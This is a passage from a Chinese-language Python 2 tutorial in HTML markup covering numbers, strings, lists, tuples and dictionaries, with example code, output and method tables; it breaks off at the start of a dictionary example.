class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;john&quot;</span></span><br></pre></td></tr></table></figure><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><p>五个标准数据类型：</p><p>Numbers（数字）</p><p>String（字符串）</p><p>List（列表）</p><p>Tuple（元组）</p><p>Dictionary（字典）</p><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>数字数据类型用于存储数值，不可改变，改变数字数据类型会分配一个新的对象。</p><p>指定一个值时，Number 对象就会被创建</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 = <span class="number">1</span></span><br><span class="line">var2 = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>del语句删除一些对象的引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> var1[,var2[,var3[....,varN]]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> var</span><br><span class="line"><span class="keyword">del</span> var_a, var_b</span><br></pre></td></tr></table></figure><p>支持的数字类型：int（有符号整型）long（长整型，也可以代表八进制和十六进制）float（浮点型）<strong>complex（复数）</strong></p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;a1a2···an&quot;</span>   <span class="comment"># n&gt;=0</span></span><br></pre></td></tr></table></figure><p>字串列表有2种取值顺序:</p><p>​从左到右索引 默认0开始，最大范围是字符串长度少1</p><p>​从右到左索引 默认-1开始，最大范围是字符串开头</p><p>实现从字符串中获取一段子字符串可以使用 <strong>[头下标:尾下标]</strong> 来截取相应的字符串，其中下标从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。</p><p><strong>[头下标:尾下标]</strong> 获取的子字符串包含头下标的字符，但不包含尾下标的字符。如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line"><span class="string">&#x27;bcde&#x27;</span></span><br></pre></td></tr></table></figure><p>当使用以冒号分隔的字符串，返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。</p><p>上面的结果包含了 <strong>s[1]</strong> 的值 b，而取到的最大范围不包括<strong>尾下标</strong>，就是 <strong>s[5]</strong> 的值 f。</p><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/o99aU.png" alt="img"></p><p>加号（+）是字符串连接运算符，星号（*）是重复操作。：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python # -*- coding: UTF-8 -*-  str = &#x27;Hello World!&#x27;  print str           # 输出完整字符串 print str[0]        # 输出字符串中的第一个字符 print str[2:5]      # 输出字符串中第三个至第六个之间的字符串 print str[2:]       # 输出从第三个字符开始的字符串 print str * 2       # 输出字符串两次 print str + &quot;TEST&quot;  # 输出连接的字符串</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">H</span><br><span class="line">llo</span><br><span class="line">llo World!</span><br><span class="line">Hello World!Hello World!</span><br><span class="line">Hello World!TEST</span><br></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>序列是Python中最基本的数据结构。序列中的每个元素都分配一个数字 - 它的位置，或索引，第一个索引是0，第二个索引是1，依此类推。序列都可以进行的操作包括索引，切片，加，乘，检查成员。</p><p>Python有6个序列的内置类型，但最常见的是列表和元组。</p><p><strong>List</strong>（列表） 是 Python 中使用最频繁的数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（即嵌套）。</p><p>列表用 <strong>[ ]</strong> 标识，是 python 最通用的复合数据类型。</p><h4 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">list3 = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br></pre></td></tr></table></figure><h4 id="访问列表中的值"><a href="#访问列表中的值" class="headerlink" title="访问列表中的值"></a>访问列表中的值</h4><p>列表中值的切割也可以用到变量 <strong>[头下标:尾下标]</strong> ，就可以截取相应的列表，从左到右索引默认 0 开始，从右到左索引默认 -1 开始，下标可以为空表示取到头或尾。</p><p>加号 <strong>+</strong> 是列表连接运算符，用于组合列表，* 号用于重复列表，是重复操作。如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">list</span> = [ <span class="string">&#x27;runoob&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;john&#x27;</span>, <span class="number">70.2</span> ]</span><br><span class="line">tinylist = [<span class="number">123</span>, <span class="string">&#x27;john&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>               <span class="comment"># 输出完整列表</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>[<span class="number">0</span>]            <span class="comment"># 输出列表的第一个元素</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>[<span class="number">1</span>:<span class="number">3</span>]          <span class="comment"># 输出第二个至第三个元素 </span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>[<span class="number">2</span>:]           <span class="comment"># 输出从第三个开始至列表末尾的所有元素</span></span><br><span class="line"><span class="built_in">print</span> tinylist * <span class="number">2</span>       <span class="comment"># 输出列表两次</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span> + tinylist    <span class="comment"># 打印组合的列表</span></span><br></pre></td></tr></table></figure><h4 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h4><p>可以对列表的数据项进行修改或更新，或使用append()方法来添加列表项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">list</span> = []          <span class="comment">## 空列表</span></span><br><span class="line"><span class="built_in">list</span>.append(<span class="string">&#x27;Google&#x27;</span>)   <span class="comment">## 使用 append() 添加元素</span></span><br><span class="line"><span class="built_in">list</span>.append(<span class="string">&#x27;Python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Python&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h4><p>使用del语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> list1</span><br><span class="line"><span class="keyword">del</span> list1[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;After deleting value at index 2 : &quot;</span></span><br><span class="line"><span class="built_in">print</span> list1</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">After deleting value at index <span class="number">2</span> :</span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">2000</span>]</span><br></pre></td></tr></table></figure><h4 id="列表脚本操作符"><a href="#列表脚本操作符" class="headerlink" title="列表脚本操作符"></a>列表脚本操作符</h4><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len([1, 2, 3])</td><td align="left">3</td><td align="left">长度</td></tr><tr><td align="left">[1, 2, 3] + [4, 5, 6]</td><td align="left">[1, 2, 3, 4, 5, 6]</td><td align="left">组合</td></tr><tr><td align="left">[‘Hi!’] * 4</td><td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td align="left">重复</td></tr><tr><td align="left">3 in [1, 2, 3]</td><td align="left">True</td><td align="left">元素是否存在于列表中</td></tr><tr><td align="left">for x in [1, 2, 3]: print x,</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table><h4 id="列表截取"><a href="#列表截取" class="headerlink" title="列表截取"></a>列表截取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L = [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L[<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;Taobao&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L[-<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;Runoob&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L[<span class="number">1</span>:]</span><br><span class="line">[<span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>描述：</p><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">L[2]</td><td align="left">‘Taobao’</td><td align="left">读取列表中第三个元素</td></tr><tr><td align="left">L[-2]</td><td align="left">‘Runoob’</td><td align="left">读取列表中倒数第二个元素</td></tr><tr><td align="left">L[1:]</td><td align="left">[‘Runoob’, ‘Taobao’]</td><td align="left">从第二个元素开始截取列表</td></tr></tbody></table><h4 id="列表函数-方法"><a href="#列表函数-方法" class="headerlink" title="列表函数&amp;方法"></a>列表函数&amp;方法</h4><table><thead><tr><th align="left">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">cmp(list1, list2)比较两个列表的元素</td></tr><tr><td align="left">2</td><td align="left">len(list) 列表元素个数</td></tr><tr><td align="left">3</td><td align="left">max(list) 返回列表元素最大值</td></tr><tr><td align="left">4</td><td align="left">min(list)返回列表元素最小值</td></tr><tr><td align="left">5</td><td align="left">list(seq)将元组转换为列表</td></tr></tbody></table><table><thead><tr><th align="left">序号</th><th align="left">方法</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">list.append(obj) 在列表末尾添加新的对象</td></tr><tr><td align="left">2</td><td align="left">list.count(obj) 统计某个元素在列表中出现的次数</td></tr><tr><td align="left">3</td><td align="left">list.extend(seq)在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td align="left">4</td><td align="left">list.index(obj) 从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td align="left">5</td><td align="left">list.insert(index, obj) 将对象插入列表</td></tr><tr><td align="left">6</td><td align="left">list.pop([index&#x3D;-1])移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td align="left">7</td><td align="left">list.remove(obj)移除列表中某个值的第一个匹配项</td></tr><tr><td align="left">8</td><td align="left">list.reverse()反向列表中元素</td></tr><tr><td align="left">9</td><td align="left">list.sort(cmp&#x3D;None, key&#x3D;None, reverse&#x3D;False) 对原列表进行排序</td></tr></tbody></table><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>元组是另一个数据类型，类似于 List（列表）。</p><p>元组用 <strong>()</strong> 标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于只读列表。</p><h4 id="创建元组"><a href="#创建元组" class="headerlink" title="创建元组"></a>创建元组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> )</span><br><span class="line">tup3 = <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span></span><br><span class="line">tup4 = ()<span class="comment">#创建空元组</span></span><br><span class="line">tup5 = (<span class="number">50</span>,)<span class="comment">#只包含一个元素时需要在元素后面添加逗号</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="访问元组"><a href="#访问元组" class="headerlink" title="访问元组"></a>访问元组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tup1[0]: &quot;</span>, tup1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tup2[1:5]: &quot;</span>, tup2[<span class="number">1</span>:<span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tup1[<span class="number">0</span>]:  physics</span><br><span class="line">tup2[<span class="number">1</span>:<span class="number">5</span>]:  (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><h4 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h4><p>元组中的元素值是不允许修改的，但我们可以对元组进行连接组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">tup1 = (<span class="number">12</span>, <span class="number">34.56</span>)</span><br><span class="line">tup2 = (<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;xyz&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 以下修改元组元素操作是非法的。</span></span><br><span class="line"><span class="comment"># tup1[0] = 100</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建一个新的元组</span></span><br><span class="line">tup3 = tup1 + tup2</span><br><span class="line"><span class="built_in">print</span> tup3</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">12</span>, <span class="number">34.56</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;xyz&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h4><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> tup</span><br><span class="line"><span class="keyword">del</span> tup</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;After deleting tup : &quot;</span></span><br><span class="line"><span class="built_in">print</span> tup</span><br></pre></td></tr></table></figure><p>元组被删除后，输出变量会有异常信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">After deleting tup :</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">9</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span> tup</span><br><span class="line">NameError: name <span class="string">&#x27;tup&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><h4 id="元组运算符"><a href="#元组运算符" class="headerlink" title="元组运算符"></a>元组运算符</h4><p>与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</p><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len((1, 2, 3))</td><td align="left">3</td><td align="left">计算元素个数</td></tr><tr><td align="left">(1, 2, 3) + (4, 5, 6)</td><td align="left">(1, 2, 3, 4, 5, 6)</td><td align="left">连接</td></tr><tr><td align="left">(‘Hi!’,) * 4</td><td align="left">(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)</td><td align="left">复制</td></tr><tr><td align="left">3 in (1, 2, 3)</td><td align="left">True</td><td align="left">元素是否存在</td></tr><tr><td align="left">for x in (1, 2, 3): print x,</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table><h4 id="元组索引与截取"><a href="#元组索引与截取" class="headerlink" title="元组索引与截取"></a>元组索引与截取</h4><p>元组也是一个序列，可以访问元组中的指定位置的元素，也可以截取索引中的一段元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L = (<span class="string">&#x27;spam&#x27;</span>, <span class="string">&#x27;Spam&#x27;</span>, <span class="string">&#x27;SPAM!&#x27;</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">L[2]</td><td align="left">‘SPAM!’</td><td align="left">读取第三个元素</td></tr><tr><td align="left">L[-2]</td><td align="left">‘Spam’</td><td align="left">反向读取，读取倒数第二个元素</td></tr><tr><td align="left">L[1:]</td><td align="left">(‘Spam’, ‘SPAM!’)</td><td align="left">截取元素</td></tr></tbody></table><h4 id="无关闭分隔符"><a href="#无关闭分隔符" class="headerlink" title="无关闭分隔符"></a>无关闭分隔符</h4><p>任意无符号的对象，以逗号隔开，默认为元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;abc&#x27;</span>, -<span class="number">4.24e93</span>, <span class="number">18</span>+<span class="number">6.6j</span>, <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line">x, y = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Value of x , y : &quot;</span>, x,y</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc -<span class="number">4.24e+93</span> (<span class="number">18</span>+<span class="number">6.6j</span>) xyz</span><br><span class="line">Value of x , y : <span class="number">1</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="元组内置函数"><a href="#元组内置函数" class="headerlink" title="元组内置函数"></a>元组内置函数</h4><table><thead><tr><th>1</th><th>cmp(tuple1, tuple2) 比较两个元组元素。</th></tr></thead><tbody><tr><td>2</td><td>len(tuple) 计算元组元素个数。</td></tr><tr><td>3</td><td>max(tuple) 返回元组中元素最大值。</td></tr><tr><td>4</td><td>min(tuple) 返回元组中元素最小值。</td></tr><tr><td>5</td><td>tuple(seq) 将列表转换为元组。</td></tr></tbody></table><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。字典是另一种可变容器模型，且可存储任意类型对象。</p><p>字典的每个键值 <strong>key:value</strong> 对用冒号 <strong>:</strong> 分割，每个键值对之间用逗号 <strong>,</strong> 分割，整个字典包括在花括号 <strong>{}</strong> 中。格式列表是有序的对象集合，字典是无序的对象集合。</p><p>区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><h4 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h4><p>格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;key1 : value1, key2 : value2 &#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>dict 作为 Python 的关键字和内置函数，变量名不建议命名为 <strong>dict</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tinydict = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tinydict[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tinydict</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;3&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>其他实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tinydict = &#123;<span class="string">&#x27;Alice&#x27;</span>: <span class="string">&#x27;2341&#x27;</span>, <span class="string">&#x27;Beth&#x27;</span>: <span class="string">&#x27;9102&#x27;</span>, <span class="string">&#x27;Cecil&#x27;</span>: <span class="string">&#x27;3258&#x27;</span>&#125;</span><br><span class="line">tinydict1 = &#123; <span class="string">&#x27;abc&#x27;</span>: <span class="number">456</span> &#125;</span><br><span class="line">tinydict2 = &#123; <span class="string">&#x27;abc&#x27;</span>: <span class="number">123</span>, <span class="number">98.6</span>: <span class="number">37</span> &#125;</span><br></pre></td></tr></table></figure><h4 id="访问字典里的值"><a href="#访问字典里的值" class="headerlink" title="访问字典里的值"></a>访问字典里的值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;Name&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;Name&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;Age&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;Age&#x27;</span>]</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tinydict[<span class="string">&#x27;Name&#x27;</span>]:  Zara</span><br><span class="line">tinydict[<span class="string">&#x27;Age&#x27;</span>]:  <span class="number">7</span></span><br></pre></td></tr></table></figure><p>如果用字典里没有的键访问数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;Alice&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;Alice&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tinydict[<span class="string">&#x27;Alice&#x27;</span>]: </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;Alice&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;Alice&#x27;</span>]</span><br><span class="line">KeyError: <span class="string">&#x27;Alice&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = 